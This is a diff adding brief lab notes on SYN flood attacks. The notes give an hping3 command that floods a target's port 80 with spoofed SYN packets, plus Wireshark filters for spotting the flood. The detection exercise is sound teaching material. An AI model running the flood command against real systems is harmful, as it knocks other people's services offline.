@@ -1,0 +1,18 @@
+# Commands & Filters 
+
+##  **Commands Used** :
+
+- **Start Wireshark to capture network traffic** : 
+    - sudo wireshark
+
+- **To Launch a SYN flood attack on port 80** :
+    - sudo hping3 -S --flood --rand-source -p 80 <target-ip>
+
+##  **Wireshark Filters to detect attack** :
+
+  - **To Detect all SYN packets without ACK (Identifies SYN flood attacks)** :
+        - tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+  - **To Filter packets targeting port 80 (Focuses on web server traffic)** :
+        - tcp.port == 80
+
